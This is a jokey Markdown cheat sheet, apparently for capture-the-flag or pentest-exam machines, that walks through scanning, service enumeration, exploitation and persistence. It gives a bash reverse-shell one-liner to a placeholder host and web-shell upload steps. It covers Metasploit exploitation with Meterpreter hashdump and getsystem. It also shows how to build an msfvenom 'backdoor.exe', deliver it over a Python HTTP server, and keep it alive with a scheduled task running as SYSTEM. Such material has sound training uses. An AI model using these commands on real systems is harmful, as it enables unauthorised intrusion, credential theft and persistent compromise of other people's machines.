# Step 0: Cry

-   Go on, have a menty b. As a treat! You deserve it.
-   Done? Cool. Let’s go gurlz.
  <img width="300" src="https://github.com/user-attachments/assets/260d5700-60ce-4528-8c38-727dc7a3cb1d" />

* * *

# Step 1: Intel Gathering

<img width="300" src="https://github.com/user-attachments/assets/48152f8d-f23f-4c88-aec0-a4cf604fe20e" />

-   Read the packet. No, seriously. **Read it.** Pls.
-   Annotate, highlight, doodle hearts in the margins if you must.
-   Everything you need is probably in there, stop ignoring it.
-   READ👏ING👏 COMP👏RE👏HEN👏SION
* * *

# Step 2: Scanning with Nmap

<img width="300" src="https://github.com/user-attachments/assets/7f3b1354-24dc-481b-a8f4-65d12a774054" />

Because if you didn’t run nmap, what are you doing with your life?

**The usual incantation:**

```bash
nmap <options> <ip>
```

**Greatest hits:**

-   `-sC` → “do your thing” default scripts
-   `-sV` → tell me the version, sweetie
-   `--script=smb-vuln*` → SMB vuln bingo
-   `-p-` → scan all the things (yes, it’ll take forever)
-   `-p21,22,80` → just the greatest hits tour
-   `-Pn` → pretend ping doesn’t exist
-   `-O` → OS guesswork, 60% of the time, it works every time
-   `-oA` → because screenshots of your terminal aren’t professional
* * *

# Step 3: Basic Enumeration

<img width="300" src="https://github.com/user-attachments/assets/5798025a-0a73-4457-80b7-3b03999cd601" />

### Port 21 – FTP

-   Anonymous logins are basically the “free samples” of pentesting.
-   Try it. Worst case, you waste 10 seconds.
-   Look for `flag.txt`, creds, or admin love notes.
* * *

### Port 22 – SSH

-   Got creds? Hell yeah brother.
-   Don’t? Move along, nothing to see here (yet).

`ssh user@ip`

* * *

### Port 23 – Telnet

-   It’s 2025. If Telnet is open, someone deserves to be fired.
-   Default creds might just work because apparently security is optional.

* * *

### Port 80 – HTTP

**Step 1: Open in browser.**

-   If it’s IIS 6.0, congrats, you basically already own it.
-   If it’s WordPress, grab coffee... you’ll be here a while.

**Step 2: Directory busting.**

```bash
gobuster dir -u http://<ip> -w <wordlist> 
feroxbuster -u http://<ip> -w <wordlist>
```

-   Run them all, because why not?

**Step 3: Grab files.**


```bash
curl -IL http://<ip>

wget http://<ip>/path/to/thing
```

**Step 4: Shell time.**


-   Upload a `.php` or `.aspx` shell.
-   Can’t upload? Inject like your life depends on it.

`bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`

* * *

### Ports 139/445 – SMB

-   Run `smbclient`. Pray for misconfigured shares.
-   If you see `C$`, wave hello to Windows internals.
-   If you see `passwords.txt`, buy a lottery ticket.

```bash
smbclient -L \\<ip> 

smbclient \\<ip>\share_name -U <user>
```

* * *

### Port 3389 – RDP

-   Because nothing says “secure” like RDP exposed to the internet.
-   Try creds, defaults, or just brute-force if you hate yourself.

```bash
xfreerdp /v:<ip> /u:administrator /p:password
```

* * *

# Step 4: Exploit Time

<img width="300" src="https://github.com/user-attachments/assets/a2dfcd16-dbd2-493a-a7da-cd1139de2dd1" />

### Searchsploit

-   Your offline exploit buddy who always forgets to shower.

```bash
searchsploit <service/version> searchsploit CVE-2025-1324
```

### Metasploit

-   When you want to look cool in front of your peers.
-   OK, but it is kind of actually really cool
-   Type exploit to exploit

```bash
msfconsole search cve:<whatever>
use <exploit>
set rhosts <target>
set lhost <me>
set lport <random_high_port>
[ other options as needed, show options bbygurl ]
exploit
?????
profit
```

**Payload options:**

-   Windows: `windows/meterpreter/reverse_tcp` (32-bit) / `windows/x64/meterpreter/reverse_tcp` (64-bit)
-   Linux: same deal, swap `linux` for `windows`
-   PHP: for when websites cry
**Meterpreter basics:**

-   `getuid` → who am I?
-   `ps` + `migrate` → musical chairs with processes
-   `hashdump` → Christmas morning for pentesters
-   `getsystem` → YOLO privilege escalation
-   `search -f *flag*` → when all else fails, ctrl+f your way to victory
* * *

# Step 5: Nevertheless, we persist
<img width="300" src="https://github.com/user-attachments/assets/2bf3f739-0a2d-416e-b9c7-b835e2402f73" />


**Create your evil gift:**

```bash
msfvenom -p <payload> lhost=<ip> lport=31337 -f exe -o backdoor.exe
```

**Get it on target:**

-   Upload with Meterpreter
-   Or spin up Python HTTP:

    ```bash
    python3 -m http.server 8000 wget http://<ip>:8000/backdoor.exe
    ```

**Make Windows do the dirty work:**

```bash
schtasks /create /tn "lolnope" /tr c:\backdoor.exe /ru SYSTEM /sc minute /mo 1
```

_(If SYSTEM cries, just run it as the compromised user instead.)_

**Listener setup:**

-   Fire up `multi/handler`.
-   Payload + port must match or you’ll be sitting there like a clown.
